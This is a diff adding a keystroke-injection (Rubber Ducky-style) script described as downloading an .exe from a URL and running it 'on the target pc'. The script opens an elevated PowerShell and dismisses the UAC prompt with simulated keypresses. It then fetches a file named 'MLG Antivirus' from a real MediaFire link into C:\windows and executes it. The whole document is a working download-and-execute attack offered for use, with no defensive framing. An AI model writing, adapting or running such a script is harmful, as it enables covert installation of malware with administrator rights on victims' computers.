@@ -1,0 +1,19 @@
+REM Author: gam3r999
+REM Description: Downloads an .exe file from the URL and runs it on the target pc.
+REM Version: 1.0
+REM Category: Execution
+DELAY 750
+WINDOWS d
+DELAY 950
+WINDOWS r
+DELAY 650
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 850
+ALT y
+DELAY 1200
+STRING $url = "https://download1321.mediafire.com/toyn1e2ap80gYwnWOupn8jM4OIXeu7s3AHi6wAYv8jaakSZQE25pLEFcmQ5gQSP24fre0MSIE0X0e8a1BS75hvOctxtoWD3X0izqGPdD_npvMq7b6V8-A1vbxixYU3zUbX1R0NegqzQ4q71rxDuqns1Ll00_b_CxdnYi793McbQjLw/jat10lcdqm8bqjw/MLG+Antivirus+-+Fery97.exe"; $output = "C:\windows\41281687.exe"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath "C:\windows\41281687.exe"; exit
+ENTER
